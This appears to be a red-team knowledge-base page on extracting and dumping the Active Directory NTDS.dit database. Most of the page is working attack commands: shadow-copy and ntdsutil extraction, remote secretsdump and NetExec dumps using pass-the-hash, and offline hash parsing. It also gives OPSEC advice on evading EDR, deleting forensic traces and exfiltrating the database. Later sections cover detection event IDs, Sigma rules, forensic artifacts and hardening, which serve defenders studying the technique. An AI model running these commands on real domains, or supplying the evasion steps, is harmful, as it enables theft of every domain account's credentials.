---
title: "Attack #39 — NTDS.dit Extraction and Dumping"
description: "The NTDS.dit file is the Active Directory database stored on every Domain Controller at C:\\Windows\\NTDS\\ntds.dit. It contains all domain credentials (NT…"
category: active-directory
tags: ["active-directory", "kerberos", "credential-access", "hashing"]
tools: ["NetExec", "Impacket", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Five/🔵 Attack #39 — NTDS.dit Extraction and Dumping.md"
---
# 🔵 Attack #39 — NTDS.dit Extraction & Dumping

***

## 📖 How It Works

The `NTDS.dit` file is the **Active Directory database** stored on every Domain Controller at `C:\Windows\NTDS\ntds.dit`. It contains all domain credentials (NT hashes, Kerberos keys, password history) for every account. Unlike DCSync (Attack #37, network-based), NTDS.dit extraction requires **local access to a DC** and involves copying the database file along with the SYSTEM registry hive for decryption.

> [!info]+ Technical Deep-Dive — NTDS.dit Database Internals
> `ris:FileList`
> 1. NTDS.dit uses the **Extensible Storage Engine (ESE / JET Blue)** database format — the same engine used by Exchange and Windows Search
> 2. The database contains multiple tables, but the critical one is the **`datatable`** — it stores all AD objects and their attributes, including the `unicodePwd` (NT hash), `supplementalCredentials` (Kerberos keys, WDigest, cleartext if reversible encryption is enabled), and `lmPwdHistory`/`ntPwdHistory` (password history)
> 3. **Encryption layers**: Credential attributes are encrypted with the **Password Encryption Key (PEK)**, which itself is encrypted with the **Boot Key (SYSKEY)** derived from the SYSTEM registry hive (`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\{JD,Skew1,GBG,Data}`)
> 4. **Decryption flow**: Extract SYSTEM hive → derive Boot Key → decrypt PEK from NTDS.dit header → use PEK to decrypt individual credential attributes
> 5. *The file is locked by the NTDS service while the DC is running — you cannot simply copy it; you must use Volume Shadow Copy, ntdsutil IFM, or other bypass methods*
> 6. The database also contains the `link_table` (group memberships), `sd_table` (security descriptors), and `msysobjects` (schema definitions)

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Local admin / SYSTEM on DC** | Required for VSS/ntdsutil/esentutl methods |
| **Or domain admin credentials** | For remote extraction methods (secretsdump, NetExec) |
| **SYSTEM registry hive** | Required for offline decryption — contains the Boot Key |

***

## 🛠️ Tools

| Tool | Platform | Version | Notes |
|---|---|---|---|
| **vssadmin** | Windows (built-in) | All versions | Volume Shadow Copy — most common local extraction method |
| **ntdsutil** | Windows (built-in) | All versions | Install From Media (IFM) — creates backup containing NTDS.dit + SYSTEM hive |
| [diskshadow](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) | Windows (built-in) | Server 2008+ | Scriptable VSS alternative — useful for non-interactive shells |
| **esentutl** | Windows (built-in) | All versions | ESE database utility — can copy locked files |
| **wmic** | Windows (built-in) | Pre-2025 | `shadowcopy create` — another VSS trigger method |
| [Impacket — secretsdump.py](https://github.com/fortra/impacket) | Linux | ≥ 0.10.0 | Remote NTDS dump via DRSUAPI or VSS |
| [NetExec](https://github.com/Pennyw0rth/NetExec) | Linux | ≥ 1.1.0 | `--ntds vss` or `--ntds drsuapi` — remote one-liner |
| [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) | Windows/PowerShell | ≥ 4.7 | `Get-ADDBAccount` — offline NTDS.dit parsing in PowerShell |
| [NTDSDumpEx](https://github.com/zcgonvh/NTDSDumpEx) | Windows | Latest | Lightweight C# NTDS.dit parser |
| [Invoke-NinjaCopy](https://github.com/PowerShellMafia/PowerSploit) | Windows/PowerShell | PowerSploit 3.0 | Copies locked files by reading raw NTFS volume — bypasses file locks |

***

## ⏱️ Time-to-Execute Estimates

| Operation | Time | Notes |
|---|---|---|
| VSS shadow copy creation | **10–60 seconds** | Depends on drive size |
| ntdsutil IFM backup | **30–120 seconds** | Creates full backup directory |
| File copy from shadow copy | **5–30 seconds** | Depends on NTDS.dit file size (100MB to 10GB+) |
| Remote dump via secretsdump | **1–30 minutes** | Depends on domain size and network speed |
| Offline parsing with secretsdump | **30–300 seconds** | CPU-bound; depends on number of accounts |

***

## 💻 Full Commands

### 🔴 Volume Shadow Copy (Most Common Method)

```powershell
# ── Create shadow copy of C: ──────────────────────────────────────────────────
vssadmin create shadow /for=C:
# Note the Shadow Copy Volume Name (e.g., \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1)

# ── Copy NTDS.dit from shadow copy ───────────────────────────────────────────
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit

# ── Copy SYSTEM hive (needed for decryption) ─────────────────────────────────
reg save HKLM\SYSTEM C:\Temp\SYSTEM

# ── Cleanup — delete shadow copy ─────────────────────────────────────────────
vssadmin delete shadows /shadow={shadow-id} /quiet
```

### 🔴 ntdsutil (Built-in Microsoft Tool)

```powershell
# ── Create IFM backup (contains NTDS.dit + registry) ─────────────────────────
ntdsutil "activate instance ntds" "ifm" "create full C:\Temp\ntds_backup" quit quit
# NTDS.dit → C:\Temp\ntds_backup\Active Directory\ntds.dit
# SYSTEM → C:\Temp\ntds_backup\registry\SYSTEM
```

### 🔴 diskshadow (Scriptable VSS — Good for Non-Interactive Shells)

```powershell
# ── Create diskshadow script ─────────────────────────────────────────────────
# Write to C:\Temp\shadow.txt:
# set context persistent nowriters
# add volume c: alias mydrive
# create
# expose %mydrive% z:
# exit

# ── Execute the script ───────────────────────────────────────────────────────
diskshadow /s C:\Temp\shadow.txt

# ── Copy NTDS.dit from the exposed shadow ─────────────────────────────────────
copy z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
reg save HKLM\SYSTEM C:\Temp\SYSTEM

# ── Cleanup ───────────────────────────────────────────────────────────────────
diskshadow
> delete shadows volume c:
> exit
```

> [!tip]+ Why diskshadow over vssadmin?
> `fas:Lightbulb`
> 1. **diskshadow** supports scripted (non-interactive) mode via `/s` flag — useful for reverse shells and C2 where interactive input isn't possible
> 2. It can **expose** the shadow copy as a drive letter (e.g., `z:`) — simpler file copy syntax
> 3. Some EDR tools specifically monitor for `vssadmin.exe` but miss `diskshadow.exe` — slightly stealthier
> 4. *Available on Server 2008+ — not available on Windows client OS (Win 10/11)*

### 🔴 esentutl (ESE Database Copy — Bypasses File Lock)

```powershell
# ── Copy locked NTDS.dit using esentutl ───────────────────────────────────────
esentutl.exe /y /vss C:\Windows\NTDS\ntds.dit /d C:\Temp\ntds.dit
# Uses VSS internally to copy the locked database file

# ── Also copy SYSTEM hive ─────────────────────────────────────────────────────
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```

### 🔴 wmic Shadow Copy

```powershell
# ── Create shadow copy via wmic ───────────────────────────────────────────────
wmic shadowcopy call create Volume='C:\'
# Note: wmic is deprecated in Server 2025+; use PowerShell CIM instead

# ── PowerShell CIM alternative ────────────────────────────────────────────────
(Get-WmiObject -List Win32_ShadowCopy).Create("C:\", "ClientAccessible")
```

### 🔴 Invoke-NinjaCopy (PowerSploit — Raw NTFS Read)

```powershell
# ── Copy locked NTDS.dit by reading raw NTFS volume ──────────────────────────
Import-Module .\PowerSploit\Exfiltration\Invoke-NinjaCopy.ps1
Invoke-NinjaCopy -Path "C:\Windows\NTDS\ntds.dit" -LocalDestination "C:\Temp\ntds.dit"
# Reads the file by parsing the raw NTFS MFT — bypasses file locks entirely
# ⚠️ Requires admin privileges and may trigger EDR (raw disk access)
```

### 🔴 NetExec / CrackMapExec (Remote — from Linux)

```bash
# ── Dump NTDS remotely via VSS ────────────────────────────────────────────────
nxc smb DC01.corp.local -u Administrator -p 'Password1' --ntds vss

# ── Via DRSUAPI (DCSync method, not file-based) ──────────────────────────────
nxc smb DC01.corp.local -u Administrator -p 'Password1' --ntds drsuapi

# ── With Pass-the-Hash ────────────────────────────────────────────────────────
nxc smb DC01.corp.local -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe --ntds vss

# ── With Kerberos ─────────────────────────────────────────────────────────────
export KRB5CCNAME=administrator.ccache
nxc smb DC01.corp.local -u Administrator -k --ntds drsuapi
```

### 🔴 Impacket — secretsdump.py (Remote)

```bash
# ── Full dump with NTDS extraction ────────────────────────────────────────────
secretsdump.py corp.local/Administrator:'Password1'@DC01.corp.local \
  -just-dc -outputfile domain_dump

# ── Using PtH ────────────────────────────────────────────────────────────────
secretsdump.py corp.local/Administrator@DC01.corp.local \
  -hashes :2b576acbe6bcfda7294d6bd18041b8fe -just-dc -outputfile dump

# ── Kerberos authentication ───────────────────────────────────────────────────
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass corp.local/Administrator@DC01.corp.local \
  -just-dc -outputfile dump
```

### 🔴 Offline Parsing (After Extraction)

```bash
# ── Parse NTDS.dit offline with secretsdump ───────────────────────────────────
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -outputfile parsed_hashes
# Outputs: parsed_hashes.ntds, parsed_hashes.ntds.kerberos, parsed_hashes.ntds.cleartext

# ── Extract only NT hashes ────────────────────────────────────────────────────
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -just-dc-ntlm -outputfile nt_only

# ── With password history ─────────────────────────────────────────────────────
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -history -outputfile with_history
```

```powershell
# ── DSInternals (PowerShell — offline parsing) ────────────────────────────────
Import-Module DSInternals
$bootKey = Get-BootKey -SystemHiveFilePath C:\Temp\SYSTEM
Get-ADDBAccount -All -DBPath C:\Temp\ntds.dit -BootKey $bootKey |
  Select-Object SamAccountName, @{N='NTHash';E={$_.NTHash | ConvertTo-Hex}} |
  Export-Csv domain_hashes.csv -NoTypeInformation

# ── Extract specific user ─────────────────────────────────────────────────────
Get-ADDBAccount -SamAccountName krbtgt -DBPath C:\Temp\ntds.dit -BootKey $bootKey
```

```bash
# ── NTDSDumpEx (lightweight C# parser) ────────────────────────────────────────
NTDSDumpEx.exe -d ntds.dit -s SYSTEM -o hashes.txt
```

***

## 🎯 OPSEC Tips

1. **DCSync (Attack #37) is almost always preferred** — no file access on the DC, no disk artifacts, and can target individual users; use NTDS.dit extraction only when DCSync is blocked (network segmentation, firewall rules)
2. **VSS shadow copies leave obvious forensic artifacts** — Event 8222, vssadmin process creation, shadow copy metadata; all are easily detected
3. **diskshadow is slightly stealthier than vssadmin** — fewer EDR rules specifically target it, and it supports scripted mode for non-interactive access
4. **Clean up shadow copies immediately** — leaving them behind is a dead giveaway; use `vssadmin delete shadows /all /quiet`
5. **Exfiltrate the NTDS.dit file off the DC before parsing** — parsing on the DC is slow and leaves a long forensic window; copy to attacker machine and parse offline
6. **NTDS.dit files can be enormous** (1–10+ GB in large environments) — consider compression before exfiltration: `Compress-Archive -Path C:\Temp\ntds.dit -DestinationPath C:\Temp\ntds.zip`
7. **ntdsutil IFM creates a directory, not a single file** — don't forget to clean up the entire directory after extraction

### 📊 OpSec Ranking

| Method | Stealth | Speed | Reliability | Notes |
|---|---|---|---|---|
| DCSync (remote, not file-based) | 🟢 High | 🟢 Fast | 🟢 High | Preferred — no DC file access needed (Attack #37) |
| secretsdump.py (remote) | 🟡 Medium | 🟡 Medium | 🟢 High | Creates temp service + VSS on DC remotely |
| diskshadow (local) | 🟡 Medium | 🟡 Medium | 🟢 High | Less monitored than vssadmin |
| vssadmin (local) | 🔴 Low | 🟡 Medium | 🟢 High | Most commonly detected; EDR rules everywhere |
| ntdsutil IFM (local) | 🔴 Low | 🟡 Medium | 🟢 High | ntdsutil.exe execution is highly suspicious on DCs |
| esentutl (local) | 🟡 Medium | 🟡 Medium | 🟡 Medium | Fewer EDR detections but still logs process creation |
| Invoke-NinjaCopy (local) | 🟡 Medium | 🔴 Slow | 🟡 Medium | Raw NTFS access may crash on very large databases |

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **8222** | Security Log (DC) | Shadow copy created — definitive VSS indicator |
| **4688** | Security Log (DC) | Process creation: `vssadmin.exe`, `ntdsutil.exe`, `diskshadow.exe`, `esentutl.exe` |
| **Sysmon 1** | Sysmon | Process creation with full command line — look for `ntds.dit`, `ifm`, `shadow` keywords |
| **Sysmon 11** | Sysmon | File creation of ntds.dit copy in unusual directory (not `C:\Windows\NTDS\`) |
| **7045** | System Log | Service installed (secretsdump creates a temp RemComSvc service for remote execution) |
| **4663** | Security Log | File access to `C:\Windows\NTDS\ntds.dit` (requires Object Access auditing configured) |
| **1102** | Security Log | Audit log cleared — attacker may attempt to cover tracks after extraction |

### 🔎 Sigma Rules

```yaml
# ── SigmaHQ — NTDS.dit Access via VSS ───────────────────────────────────────
title: NTDS.dit Access via Volume Shadow Copy
id: c5c50bfa-5f39-497f-b862-41c3a9e455bc
status: stable
logsource:
  product: windows
  category: process_creation
detection:
  selection_vss:
    Image|endswith:
      - '\vssadmin.exe'
      - '\diskshadow.exe'
    CommandLine|contains:
      - 'create shadow'
      - 'create'
  selection_ntdsutil:
    Image|endswith: '\ntdsutil.exe'
    CommandLine|contains: 'ifm'
  condition: selection_vss or selection_ntdsutil
level: critical
tags:
  - attack.credential_access
  - attack.t1003.003
```

```yaml
# ── SigmaHQ — NTDS.dit File Copy ─────────────────────────────────────────────
title: Suspicious NTDS.dit File Access
id: 8bc64091-6875-4881-aaf1-f1c1bd6469cd
logsource:
  product: windows
  category: file_event
detection:
  selection:
    TargetFilename|contains: 'ntds.dit'
    TargetFilename|endswith: '.dit'
  filter_legitimate:
    TargetFilename|startswith: 'C:\Windows\NTDS\'
  condition: selection and not filter_legitimate
level: critical
```

### 🛡️ EDR-Specific Detections

> [!warning]+ Microsoft Defender for Identity (MDI)
> `ris:Windows`
> 1. **"Suspected NTDS.dit theft"** — detects ntdsutil IFM creation and VSS-based NTDS.dit access patterns
> 2. MDI correlates process creation on DCs with known NTDS.dit extraction command patterns
> 3. *MDI is less effective for NTDS.dit extraction than for DCSync because the extraction happens locally, not over the network*

> [!warning]+ CrowdStrike Falcon
> `ris:Radar`
> 1. **"NTDS.dit Credential Dumping"** — behavioral detection for VSS creation followed by ntds.dit file access
> 2. **"Volume Shadow Copy Abuse"** — flags vssadmin/diskshadow when combined with file access to sensitive paths
> 3. Process tree analysis detects `cmd.exe → vssadmin.exe → copy ntds.dit` chains

> [!warning]+ Elastic Security
> `ris:FileList`
> 1. Rule: **"NTDS or SAM Database File Copied"** — file event monitoring for ntds.dit copies outside the NTDS directory
> 2. Rule: **"Volume Shadow Copy Creation"** — process creation monitoring for vssadmin/diskshadow with shadow creation arguments
> 3. Rule: **"Credential Dumping via NTDSutil"** — specific ntdsutil IFM command detection

***

## 🔬 Forensic Artifacts

| Artifact | Location | Details |
|---|---|---|
| **Shadow copy metadata** | VSS storage (`System Volume Information`) | Shadow copy creation/deletion timestamps; may persist even after deletion |
| **Event 8222** | DC Security Log | Shadow copy creation event with timestamp and volume information |
| **Process execution** | Event 4688 / Sysmon 1 | vssadmin.exe, ntdsutil.exe, diskshadow.exe, esentutl.exe with full command lines |
| **File creation** | Sysmon 11 | ntds.dit file created in non-standard location (C:\Temp, C:\Users, etc.) |
| **IFM directory** | Disk forensics | `ntds_backup\Active Directory\ntds.dit` + `ntds_backup\registry\SYSTEM` directory structure |
| **Temp service** | Event 7045 / System Log | secretsdump.py creates RemComSvc service for remote execution; service name and binary path logged |
| **Prefetch** | `C:\Windows\Prefetch\` | `VSSADMIN.EXE-*.pf`, `NTDSUTIL.EXE-*.pf` — execution timestamps survive tool cleanup |
| **USN Journal** | NTFS `$UsnJrnl:$J` | File creation/deletion entries for ntds.dit copies |

***

> [!important]+ Windows Server Version Differences
> `ris:Windows`
> 1. **Server 2012 R2**: All extraction methods work; minimal built-in detection
> 2. **Server 2016**: vssadmin event logging improved; Sysmon recommended for file-level monitoring
> 3. **Server 2019**: Credential Guard protects LSASS but does **NOT** protect NTDS.dit file extraction — the file is a separate attack surface
> 4. **Server 2022**: No new NTDS.dit protection mechanisms; Microsoft recommends MDI + EDR on DCs
> 5. **Server 2025**: `wmic.exe` is deprecated/removed — use PowerShell CIM cmdlets instead for shadow copy creation; all other methods still work
> 6. *Microsoft's strategic direction is to move credentials out of NTDS.dit entirely (e.g., cloud-only identities with Entra ID), but hybrid AD environments will have NTDS.dit for the foreseeable future*

***

## 🔒 Hardening & Prevention

```powershell
# ── 1. Monitor VSS shadow copy creation on DCs ───────────────────────────────
# GPO → Computer Configuration → Windows Settings → Security Settings →
# Advanced Audit Policy → Object Access → Audit Other Object Access Events
# This generates Event 4663 for sensitive file access

# ── 2. Application whitelisting on DCs ────────────────────────────────────────
# Use AppLocker or WDAC to restrict what can run on DCs:
# Block: vssadmin.exe from non-admin contexts
# Block: ntdsutil.exe from non-admin scheduled tasks
# Block: PowerShell constrained language mode for non-admins

# ── 3. Monitor file access to NTDS.dit ───────────────────────────────────────
# Configure SACL on C:\Windows\NTDS\ntds.dit:
$acl = Get-Acl "C:\Windows\NTDS\ntds.dit"
$rule = New-Object System.Security.AccessControl.FileSystemAuditRule(
  "Everyone", "Read", "Success"
)
$acl.AddAuditRule($rule)
Set-Acl "C:\Windows\NTDS\ntds.dit" $acl
# ⚠️ Will generate events for legitimate NTDS operations too — tune carefully

# ── 4. Enable command-line logging in process creation events ─────────────────
# GPO → Computer Configuration → Admin Templates → System → Audit Process Creation
# ✅ Include command line in process creation events
# This makes Event 4688 include the full command line

# ── 5. Deploy Sysmon on all DCs ──────────────────────────────────────────────
# Sysmon config for NTDS.dit monitoring:
# <FileCreate onmatch="include">
#   <TargetFilename condition="contains">ntds.dit</TargetFilename>
# </FileCreate>
# <ProcessCreate onmatch="include">
#   <Image condition="end with">vssadmin.exe</Image>
#   <Image condition="end with">ntdsutil.exe</Image>
#   <Image condition="end with">diskshadow.exe</Image>
# </ProcessCreate>

# ── 6. Restrict remote access to DCs ─────────────────────────────────────────
# Implement Tiered Administration:
# Only Tier 0 admin accounts should have interactive/remote logon rights on DCs
# Deny logon locally/RDP for standard domain admins on DCs
# Block SMB access to DCs from workstation VLANs (where possible)

# ── 7. EDR on Domain Controllers ─────────────────────────────────────────────
# Deploy EDR agent (Defender for Endpoint, CrowdStrike, etc.) on ALL DCs
# Configure real-time monitoring for credential theft patterns
```

***

## 🧩 Troubleshooting

| Error | Cause | Fix |
|---|---|---|
| `vssadmin: Error: Access is denied` | Not running as admin / SYSTEM on the DC | Elevate to local admin; use `psexec -s cmd` for SYSTEM context |
| `secretsdump: STATUS_ACCESS_DENIED` | Account doesn't have admin rights on DC | Verify DA membership; try `-hashes` for PtH or `-k` for Kerberos auth |
| `ERROR_SHARING_VIOLATION` when copying ntds.dit | Trying to copy the live file without VSS | Use VSS shadow copy, ntdsutil IFM, or esentutl `/y /vss` — cannot copy the live file directly |
| secretsdump returns `Cannot open NTDS.dit` | Incorrect file path or corrupted database | Verify file path; if parsing offline, ensure both `ntds.dit` and `SYSTEM` files are from the same DC |
| Offline parsing returns garbage / wrong hashes | SYSTEM hive doesn't match the NTDS.dit | The SYSTEM hive must be from the SAME DC as the NTDS.dit — different DCs have different Boot Keys |
| ntdsutil IFM fails with `error 0xc00002e1` | NTDS service not running or database inconsistent | Run `ntdsutil → files → integrity` first; the service must be running for IFM creation |
| Shadow copy creation hangs | Low disk space or VSS writer failure | Check `vssadmin list writers` for failed writers; ensure at least 10% free disk space on the volume |
| NetExec `--ntds vss` returns timeout | Large NTDS.dit file + slow network | Increase timeout with `--timeout 300`; or extract locally and parse offline |

***

## 🗺️ MITRE ATT&CK

| Tactic | Technique ID | Sub-technique | Procedure | APT Groups |
|---|---|---|---|---|
| **Credential Access** | [T1003](https://attack.mitre.org/techniques/T1003/) | [.003 — NTDS](https://attack.mitre.org/techniques/T1003/003/) | Extract NTDS.dit via VSS/ntdsutil/diskshadow and parse offline for all domain credentials | [APT28](https://attack.mitre.org/groups/G0007/) (Fancy Bear), [FIN6](https://attack.mitre.org/groups/G0037/), [Wizard Spider](https://attack.mitre.org/groups/G0102/) |
| **Collection** | [T1005](https://attack.mitre.org/techniques/T1005/) | Data from Local System | Copy NTDS.dit and SYSTEM hive files from the DC filesystem | Commonly used by ransomware operators |
| **Defense Evasion** | [T1006](https://attack.mitre.org/techniques/T1006/) | Direct Volume Access | Use Invoke-NinjaCopy to read raw NTFS volume bypassing file locks | Advanced red team operations |

> [!tip]+ Real-World APT Usage
> `fas:Lightbulb`
> 1. **APT28 (Fancy Bear)** — Used ntdsutil IFM extraction after gaining DC access in government network compromises
> 2. **Wizard Spider (Ryuk/Conti)** — Frequently used `vssadmin create shadow` + NTDS.dit extraction as part of their domain compromise playbook before deploying ransomware
> 3. **FIN6** — Extracted NTDS.dit for offline credential cracking to access payment processing systems
> 4. *NTDS.dit extraction is considered "noisier" than DCSync but is still widely used when network-level replication is blocked*

***

## 🔗 Attack Chain Context

```
[NTDS.dit] ──→ Direct Database Extraction → All Domain Credentials
         │
         ├──→ 🆚 DCSync (Attack #37) is preferred — no DC file access needed
         ├──→ 🔗 Useful when: network segmentation blocks DCSync RPC
         ├──→ 🔑 Extract KRBTGT hash → Golden Ticket (Attack #11)
         ├──→ 💻 Extract all NT hashes → Pass-the-Hash (Attack #4)
         ├──→ 🔓 Offline cracking of all domain passwords
         ├──→ 📋 Requires: local admin / SYSTEM on DC, or remote admin via secretsdump
         └──→ 💀 Defeated by: monitor shadow copy creation, EDR on DCs, Sysmon file monitoring
```

***

> ✅ **Attack #39 — NTDS.dit Extraction complete.**
